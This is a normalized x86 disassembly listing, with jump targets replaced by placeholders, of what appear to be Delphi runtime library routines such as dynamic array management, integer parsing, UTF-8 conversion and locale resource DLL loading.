add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404abc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404a70
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405a38
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_40538c
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_4028f8
sub_404bcc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_402998
mov edx [ eax + esi ]
add eax ebx
call sub_40405c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404750
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404bb4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_402998
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404ce8
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404bcc
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405a50
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4053c8
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028f8
sub_404ce8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40405c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404750
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404bb4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404ce8
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404bcc
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405a50
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4053c8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028f8
sub_404e0c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404880
mov edx eax
mov ecx esi
mov eax ebx
call sub_404e00
pop edx
pop esi
pop ebx
retn
sub_404e30
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4042c8
mov ecx eax
mov eax esp
mov edx ebx
call sub_404774
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404e5c
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e80
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_4029d8
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_4029d8
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404e5c
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_4050e0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4050d8
jmp r-xdata
mov al 0x4
call sub_4028f8
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_4028f8
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027dc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_40279c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c40
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404abc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402998
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c40
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_4050c0
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4050e0
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405278
push ebx
test eax eax
je r-xdata
mov eax ecx
call sub_40538c
pop ebx
retn
mov ebx eax
sub ebx 0x4
mov ebx [ ebx ]
push ebx
push ecx
xor ecx ecx
call sub_405298
pop ebx
retn
sub_405298
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4050d8
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
test edi edi
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax 0x4
mov eax [ eax ]
cmp eax edi
jge r-xdata
add esi edi
xor edi edi
mov edx eax
sub edx edi
cmp esi edx
jle r-xdata
mov edi eax
test esi esi
jge r-xdata
mov esi edx
test esi esi
jle r-xdata
xor esi esi
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x1 ]
add [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x2 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x6 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax esi
imul [ ebp - 0xc ]
add eax 0x8
call sub_40279c
mov ebx eax
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] esi
add ebx 0x4
imul edi [ ebp - 0xc ]
add [ ebp - 0x4 ] edi
test esi esi
jle r-xdata
mov ecx esi
imul ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_402998
mov edx esi
imul edx [ ebp - 0xc ]
mov eax ebx
xor ecx ecx
call sub_402c40
push esi
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4050c0
jmp r-xdata
sub_40538c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4027bc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404abc
sub_4053c8
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_40538c
pop edx
pop eax
sub_4053f0
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4013ac
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405420
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40133c
mov eax esp
mov dl 0x1
call sub_40565c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405468
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405420
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4054a4
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401344
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40134c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405490
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405490
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405490
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_40565c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40133c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401394
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405761
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4054a4
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_40139c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401394
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40138c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40139c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401394
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40135c
push eax
call sub_401334
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4058fc
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4027bc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4027bc
jmp r-xdata
sub_40595c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405997
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4059c8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405a2c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40595c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a33
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405a50
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_405a7c
test edx edx
je sub_405a38
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_4028f8
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405ae4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405b48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405c24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
